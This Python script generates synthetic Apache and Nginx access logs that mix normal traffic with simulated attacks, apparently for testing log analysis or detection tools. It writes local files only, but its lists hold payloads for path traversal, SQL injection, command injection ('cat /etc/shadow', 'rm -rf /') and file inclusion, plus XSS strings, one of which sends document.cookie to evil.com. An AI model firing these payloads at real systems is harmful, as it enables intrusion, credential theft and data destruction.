#!/usr/bin/env python3
"""
Enhanced Log Generator for Apache and Nginx
-------------------------------------------
Generates fake access logs containing:
- Normal traffic
- Brute force attempts
- Directory traversal
- SQL Injection
- XSS attacks
- Command injection
- File inclusion attacks
- Suspicious User-Agents
- Port scanning
- Bot traffic
- DDoS patterns
"""

import random
import time
from datetime import datetime, timedelta
import re

# -------------------------
# Configuration
# -------------------------
APACHE_LOG = "./apache_access.log"
NGINX_LOG = "./nginx_access.log"

NUM_LOGS = 500  # Increased for more variety

# IP ranges for different attack types
normal_ips = ["192.168.1.10", "192.168.1.15", "192.168.1.20", "10.0.0.5", "10.0.0.10"]
malicious_ips = ["185.220.101.45", "45.95.147.12", "91.200.114.58", "103.149.130.12", "185.220.101.32"]
bot_ips = ["66.249.64.1", "66.249.64.2", "66.249.64.3", "34.102.136.180", "34.102.136.181"]

users = ["-", "admin", "guest", "user", "test"]
methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]

# User agents
uas_normal = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "curl/8.0.1",
    "PostmanRuntime/7.32.3",
]

uas_bad = [
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "nikto/2.1.6",
    "hydra/9.1",
    "nmap/7.94",
    "dirb/2.22",
    "gobuster/3.1.0",
    "wfuzz/3.1.0",
    "burpsuite/2023.1.1",
    "w3af/2.0.0",
    "zap/2.14.0",
]

uas_bots = [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Slurp/3.0 (+http://help.yahoo.com/help/us/ysearch/slurp)",
    "DuckDuckBot/1.0 (+http://duckduckgo.com/duckduckbot.html)",
]

# Normal paths
paths_normal = [
    "/", "/index.html", "/about", "/contact", "/login", "/products", 
    "/api/users", "/api/products", "/admin", "/dashboard", "/profile",
    "/search", "/blog", "/news", "/help", "/support", "/faq"
]

# Attack payloads
paths_traversal = [
    "/../../etc/passwd", "/..%2F..%2F..%2Fwindows/win.ini",
    "/....//....//....//etc/passwd", "/..%252F..%252F..%252Fetc/passwd",
    "/..%c0%af..%c0%af..%c0%afetc/passwd", "/..%255c..%255c..%255cwindows/win.ini",
    "/..%5c..%5c..%5cwindows/system32/config/sam", "/..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc/passwd"
]

paths_sqli = [
    "/p.php?id=1' OR 1=1 --",
    "/search?q=test' UNION SELECT * FROM users --",
    "/user.php?id=1' AND 1=1 --",
    "/product.php?id=1' OR '1'='1",
    "/login.php?user=admin'--&pass=test",
    "/api/users?id=1' UNION SELECT username,password FROM users--",
    "/search?q=test' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "/admin?id=1' OR 1=1 ORDER BY 1--",
    "/user?id=1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--"
]

paths_xss = [
    "/search?q=<script>alert('XSS')</script>",
    "/comment?text=<img src=x onerror=alert('XSS')>",
    "/profile?name=<svg onload=alert('XSS')>",
    "/search?q=javascript:alert('XSS')",
    "/user?name=<iframe src=javascript:alert('XSS')></iframe>",
    "/post?content=<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
    "/search?q=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
]

paths_cmd_injection = [
    "/ping?host=127.0.0.1; cat /etc/passwd",
    "/system?cmd=whoami",
    "/exec?command=ls -la",
    "/shell?cmd=id",
    "/admin?action=backup; rm -rf /",
    "/api/system?cmd=netstat -an",
    "/debug?cmd=ps aux",
    "/test?host=127.0.0.1 | cat /etc/shadow",
    "/ping?ip=127.0.0.1 && cat /etc/passwd"
]

paths_file_inclusion = [
    "/include?file=../../../etc/passwd",
    "/load?page=../../../../var/log/apache2/access.log",
    "/view?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/include?page=../../../../proc/version",
    "/load?file=..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log",
    "/view?page=../../../../etc/hosts",
    "/include?file=..%2F..%2F..%2F..%2Fproc%2Fcpuinfo"
]

paths_bruteforce = [
    "/login", "/admin", "/admin/login", "/wp-admin", "/administrator",
    "/admin.php", "/admin.html", "/admin/index.php", "/admin/dashboard"
]

paths_port_scan = [
    "/", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
    "/favicon.ico", "/humans.txt", "/crossdomain.xml", "/clientaccesspolicy.xml"
]

# Referrer patterns
referrers = [
    "-",
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.linkedin.com/",
    "https://github.com/",
    "https://stackoverflow.com/",
    "https://reddit.com/",
    "https://youtube.com/"
]

def rand_timestamp():
    """Generate realistic timestamps with clustering patterns"""
    now = datetime.now()
    
    # Create time clusters (attacks often happen in bursts)
    if random.random() < 0.3:  # 30% chance of recent timestamp
        delta = timedelta(seconds=random.randint(0, 300))
    elif random.random() < 0.5:  # 50% chance of within last hour
        delta = timedelta(seconds=random.randint(300, 3600))
    else:  # 20% chance of older
        delta = timedelta(seconds=random.randint(3600, 86400))
    
    ts = now - delta
    return ts.strftime("%d/%b/%Y:%H:%M:%S %z") or ts.strftime("%d/%b/%Y:%H:%M:%S +0000")

def make_apache_log(ip, user, method, path, status, size, ua, referrer="-"):
    ts = rand_timestamp()
    return f'{ip} - {user} [{ts}] "{method} {path} HTTP/1.1" {status} {size} "{referrer}" "{ua}"'

def make_nginx_log(ip, user, method, path, status, size, ua, referrer="-", req_time=0.123):
    ts = rand_timestamp()
    return f'{ip} - {user} [{ts}] "{method} {path} HTTP/1.1" {status} {size} "{referrer}" "{ua}" {req_time:.3f}'

def generate_attack_sequence(attack_type, base_ip):
    """Generate a sequence of related attack logs"""
    logs = []
    
    if attack_type == "bruteforce":
        # Generate multiple failed login attempts
        for i in range(random.randint(5, 15)):
            path = random.choice(paths_bruteforce)
            ua = random.choice(uas_bad)
            logs.append({
                'ip': base_ip,
                'user': '-',
                'method': 'POST',
                'path': path,
                'status': 401,
                'size': random.randint(200, 500),
                'ua': ua,
                'referrer': '-'
            })
    
    elif attack_type == "port_scan":
        # Generate rapid requests to different endpoints
        for path in random.sample(paths_port_scan, random.randint(3, 8)):
            ua = random.choice(uas_bad)
            logs.append({
                'ip': base_ip,
                'user': '-',
                'method': 'GET',
                'path': path,
                'status': random.choice([200, 404, 403]),
                'size': random.randint(100, 300),
                'ua': ua,
                'referrer': '-'
            })
    
    elif attack_type == "sqli_enumeration":
        # Generate SQL injection attempts with different payloads
        for payload in random.sample(paths_sqli, random.randint(3, 8)):
            ua = random.choice(uas_bad)
            logs.append({
                'ip': base_ip,
                'user': '-',
                'method': 'GET',
                'path': payload,
                'status': random.choice([200, 500, 404]),
                'size': random.randint(200, 800),
                'ua': ua,
                'referrer': '-'
            })
    
    return logs

def generate_logs():
    apache_logs = []
    nginx_logs = []
    
    # Generate normal traffic (60%)
    normal_count = int(NUM_LOGS * 0.6)
    for _ in range(normal_count):
        ip = random.choice(normal_ips)
        user = random.choice(users)
        method = random.choice(methods)
        path = random.choice(paths_normal)
        ua = random.choice(uas_normal + uas_bots)
        referrer = random.choice(referrers)
        
        # Realistic status codes for normal traffic
        if method == "GET":
            status = random.choices([200, 302, 404], weights=[80, 10, 10])[0]
        else:
            status = random.choices([200, 201, 400, 404], weights=[70, 10, 15, 5])[0]
        
        size = random.randint(100, 10000)
        
        apache_logs.append(make_apache_log(ip, user, method, path, status, size, ua, referrer))
        nginx_logs.append(make_nginx_log(ip, user, method, path, status, size, ua, referrer))
    
    # Generate attack traffic (40%)
    attack_count = NUM_LOGS - normal_count
    
    # Single attack logs
    for _ in range(int(attack_count * 0.7)):
        ip = random.choice(malicious_ips)
        user = random.choice(users)
        method = random.choice(methods)
        ua = random.choice(uas_bad)
        
        # Randomly select attack type
        attack_type = random.choices(
            ["traversal", "sqli", "xss", "cmd_injection", "file_inclusion", "badua"],
            weights=[15, 20, 15, 15, 15, 20],
        )[0]
        
        if attack_type == "traversal":
            path = random.choice(paths_traversal)
            status = 404
        elif attack_type == "sqli":
            path = random.choice(paths_sqli)
            status = random.choice([200, 500, 404])
        elif attack_type == "xss":
            path = random.choice(paths_xss)
            status = random.choice([200, 400, 404])
        elif attack_type == "cmd_injection":
            path = random.choice(paths_cmd_injection)
            status = random.choice([200, 500, 403])
        elif attack_type == "file_inclusion":
            path = random.choice(paths_file_inclusion)
            status = random.choice([200, 404, 403])
        elif attack_type == "badua":
            path = random.choice(paths_normal)
            status = 200
        
        size = random.randint(200, 2000)
        
        apache_logs.append(make_apache_log(ip, user, method, path, status, size, ua))
        nginx_logs.append(make_nginx_log(ip, user, method, path, status, size, ua))
    
    # Generate attack sequences (30% of attack traffic)
    sequence_count = int(attack_count * 0.3)
    for _ in range(sequence_count // 10):  # Each sequence generates ~10 logs
        ip = random.choice(malicious_ips)
        attack_type = random.choice(["bruteforce", "port_scan", "sqli_enumeration"])
        
        sequence_logs = generate_attack_sequence(attack_type, ip)
        for log_entry in sequence_logs:
            apache_logs.append(make_apache_log(**log_entry))
            nginx_logs.append(make_nginx_log(**log_entry))
    
    # Shuffle logs to make them more realistic
    random.shuffle(apache_logs)
    random.shuffle(nginx_logs)
    
    return apache_logs, nginx_logs

def main():
    print("🔧 Generating enhanced security logs...")
    apache_logs, nginx_logs = generate_logs()

    with open(APACHE_LOG, "w") as f:
        for line in apache_logs:
            f.write(line + "\n")

    with open(NGINX_LOG, "w") as f:
        for line in nginx_logs:
            f.write(line + "\n")

    print(f"✅ Generated {len(apache_logs)} Apache logs -> {APACHE_LOG}")
    print(f"✅ Generated {len(nginx_logs)} Nginx logs -> {NGINX_LOG}")
    print(f"📊 Attack distribution:")
    print(f"   - Normal traffic: ~60%")
    print(f"   - Single attacks: ~28%")
    print(f"   - Attack sequences: ~12%")
    print(f"🎯 Attack types included:")
    print(f"   - Directory traversal, SQL injection, XSS")
    print(f"   - Command injection, File inclusion")
    print(f"   - Brute force, Port scanning")
    print(f"   - Suspicious User-Agents")

if __name__ == "__main__":
    main()
